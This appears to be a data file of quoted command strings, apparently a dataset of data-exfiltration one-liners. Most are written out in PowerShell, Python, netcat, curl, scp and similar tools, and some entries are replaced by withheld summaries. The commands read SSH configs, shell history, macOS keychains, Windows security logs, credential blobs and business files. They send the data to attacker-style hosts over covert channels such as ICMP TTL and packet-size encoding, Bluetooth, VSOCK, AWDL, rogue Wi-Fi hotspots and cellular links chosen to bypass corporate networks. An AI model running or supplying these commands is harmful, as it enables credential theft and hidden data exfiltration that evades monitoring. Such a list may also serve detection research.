  "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
  "$dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
  "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name=\"$($ad.Name)\" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\\Users\\Public\\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $i=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$i\" static 10.226.38.2 255.255.255.252 | Out-Null; $buf=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\song.mp3'); $b=[Convert]::ToBase64String($buf); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.226.38.2'),0)); $cli.Connect('10.226.38.1',54295); $ns=$cli.GetStream(); [byte[]]$head=[Text.Encoding]::UTF8.GetBytes('POST /d HTTP/1.0`r`nX: bt`r`n`r`n'); $ns.Write($head,0,$head.Length); $bts=[Text.Encoding]::UTF8.GetBytes($b); $ns.Write($bts,0,$bts.Length); $ns.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.224.17.2 255.255.255.252 | Out-Null; $q=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\q3-report.docx')); $t=New-Object Net.Sockets.TcpClient; $t.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.224.17.2'),0)); $t.Connect('10.224.17.1',53337); $st=$t.GetStream(); $req=[Text.Encoding]::UTF8.GetBytes(('GET /u?d='+[Uri]::EscapeDataString($q)+' HTTP/1.1`r`nHost: x`r`nConnection: close`r`n`r`n')); $st.Write($req,0,$req.Length); $st.Close(); $t.Close()",
  "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('64:6E:6C:AA:BB:CC', 0x1009)); p=os.path.expanduser('~/.ssh/config'); import sys; d=b'';\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ntry:\\n d=open(p,'rb').read()\\nexcept Exception:\\n d=b''\\nfinally:\\n s.sendall(d); s.close()\"",
  "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
  "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((3, 58821)); p=os.path.expanduser('~/.config/gtk-3.0/bookmarks'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
  "[withheld — non-actionable: would send base64-encoded data in fixed-size chunks via IPv6 UDP (AF_INET6/SOCK_DGRAM) to a unique-local address with a low hop-limit]",
  "[withheld — non-actionable: would send base64-encoded data via IPv6 UDP to a link-local target using a specified scope ID, segmenting payload to avoid detection and common ports]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to a secondary/non-default local address, optionally set DSCP/TOS, and transmit base64-encoded chunks to a high-numbered port]",
  "[withheld — non-actionable: would set SO_DONTROUTE on an IPv4 TCP socket, bind to a non-default local address, connect to a high, uncommon port, and send base64-encoded data]",
  "[withheld — non-actionable: would use IPv6 UDP with a specified traffic class (if available) to send base64-encoded chunks to a unicast destination on a high, uncommon port]",
  "[withheld — non-actionable: would bind an IPv6 TCP socket to a non-default link-local source address (scope-indexed) before connecting to a unique-local IPv6 target on a high port, then send base64 data]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to an APIPA/isolated adapter address and send base64-encoded chunks to a peer on an uncommon UDP port with low TTL]",
  "[withheld — non-actionable: would open an IPv6 TCP socket (AF_INET6) scoped to a link-local interface and transmit base64-encoded file data to a high, uncommon port]",
  "[withheld — non-actionable: would craft ICMP Echo Request packets (AF_INET/SOCK_RAW, IPPROTO_ICMP) carrying base64-encoded payload segments with proper checksums]",
  "[withheld — non-actionable: would enforce IPv6-only on a TCP socket and send base64-encoded data to a unique-local IPv6 service listening on an uncommon port]",
  "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
  "python3 -c 'import socket,datetime; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"198.51.100.23\", 49201)); prefix=(\"<34>1 \"+datetime.datetime.utcnow().isoformat()+\"Z macos app - - - \").encode(); s.sendall(prefix+open(\"/Users/Shared/.slog\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.88\", 52689)); d=open(\"/Users/Shared/.rpt\",\"rb\").read(); s.sendall(struct.pack(\"!I\",len(d))+d); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP); s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1); addr=(\"239.197.3.9\", 49321); d=open(\"/Users/Shared/.localstate\",\"rb\").read(); [s.sendto(d[i:i+800], addr) for i in range(0,len(d),800)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TCLASS, 0x2c); addr=(\"2001:db8:44::4\", 49512, 0, 0); d=open(\"/Users/Shared/.cache2\",\"rb\").read(); [s.sendto(d[i:i+600], addr) for i in range(0,len(d),600)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.connect((\"2001:db8:ac:2::9\", 55999, 0, 0)); s.sendall(open(\"/Users/Shared/._q\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.77\", 2526)); w=lambda x:s.sendall(x); w(b\"HELO x\\r\\nMAIL FROM:<u@lab>\\r\\nRCPT TO:<r@lab>\\r\\nDATA\\r\\n\"); w(open(\"/Users/Shared/.z\",\"rb\").read()+b\"\\r\\n.\\r\\nQUIT\\r\\n\"); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); addr=(\"2001:db8:ab:1::7\", 49160, 0, 0); d=open(\"/Users/Shared/.cache.db\",\"rb\").read(); [s.sendto(d[i:i+900], addr) for i in range(0,len(d),900)]; s.close()'",
  "python3 -c 'import socket,time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"198.51.100.45\", 49444); d=open(\"/Users/Shared/.k\",\"rb\").read(); [ (s.sendto(d[i:i+700], addr), time.sleep(0.15)) for i in range(0,len(d),700) ]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"qa-mesh-161\" \"mesh-161#\" && tar -C /Users/Shared/exports -czf - logs | base64 | split -b 1200k - /tmp/.w && for f in /tmp/.w*; do nc -6 fe80::a1b2:c3d4:e5f6:1122%en0 60477 -w 2 < \"$f\"; rm \"$f\"; done",
  "IF=wlan2; iwconfig \"$IF\" >/dev/null 2>&1 && python3 -c 'import os,sys,socket,subprocess; iface=os.environ[\"IF\"]; src=subprocess.check_output(\"ip -4 -o addr show \"+iface, shell=True).decode().split()[3].split(\"/\")[0]; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((src,0)); s.sendto(open(sys.argv[1],\"rb\").read(), (sys.argv[2], int(sys.argv[3])))' /home/user/.local/state/cache.idx 10.55.88.11 49537",
  "iwconfig wlan1 >/dev/null 2>&1 && scp -q -P 49288 -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" /home/user/.local/share/keys.db exfil@10.55.88.20:~/rx/keys.db",
  "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
  "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
  "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
  "iwconfig wlan2 >/dev/null 2>&1 && nc -w 3 -s \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.6 49321 < /home/user/.local/share/usage.log",
  "cat /Users/$USER/Library/Preferences/com.apple.finder.plist | nc -s \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.88 58231",
  "tar cf - ~/Library/Group\\ Containers | gzip -1 | nc -s \"$(networksetup -getinfo 'FireWire' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.10 55284",
  "curl --interface \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" --header 'Content-Type: application/octet-stream' --data-binary @/Users/$USER/Library/Keychains/login.keychain-db http://203.0.113.51:52888/k",
  "sysctl -a | gzip -c | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.66 57114",
  "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
  "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
  "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
  "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
  "nc -6 -s \"$(ipconfig getv6ifaddr stf0)\" \"fe80::9:bead:3%stf0\" 52217 < /tmp/.q",
  "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr awdl0)\" \"fe80::b0b:beef:1%awdl0\" 52789 < /var/log/system.log",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr awdl0)';dst='fe80::3:dead:beef%awdl0';p=open('/tmp/diag.bin','rb').read();[send(IPv6(src=src,dst=dst)/UDP(sport=51888,dport=51888)/p[i:i+1200],iface='awdl0',verbose=0) for i in range(0,len(p),1200)]\"",
  "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
  "nohup tcpdump -i bnep0 -nn tcp port 53211 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.44.10 192.168.44.20 53211 < /var/tmp/.cache/img.dat",
  "nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc",
  "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap",
  "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
  "nohup tcpdump -i ib0 -nn tcp port 56473 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.0.0.10 10.0.0.20 56473 < /var/tmp/pkg.cache",
  "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
  "nohup tcpdump -i wwan0 -nn udp port 56107 -U -w /dev/null >/dev/null 2>&1 & gzip -c /var/tmp/local.db | nc -u -s 10.64.23.5 10.64.23.9 56107",
  "$cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $dst='198.18.0.42'; $gw=(Get-NetIPConfiguration -InterfaceIndex $cell.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $dst mask 255.255.255.255 $gw metric 5 if $($cell.ifIndex)\"}; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $dst -p 65055 -B $ip -t 50",
  "$bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 172.31.199.2 -p 55222 -B $lip -u -t 40\"",
  "New-NetIPAddress -InterfaceAlias 'Bluetooth Network Connection' -IPAddress 192.168.55.10 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 59321 -B 192.168.55.10\"",
  "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
  "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
  "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
  "netsh wlan set hostednetwork mode=allow ssid=DiagWiFi key=Passw0rd! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction SilentlyContinue; if($hn){New-NetIPAddress -InterfaceIndex $hn.ifIndex -IPAddress 192.168.88.1 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 192.168.88.2 -p 63456 -B 192.168.88.1 -t 40\"}",
  "netsh wlan set hostednetwork mode=allow ssid=svc_diag key=K0mp!exP@ss! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $hn.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 60789 -B $ip\"",
  "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
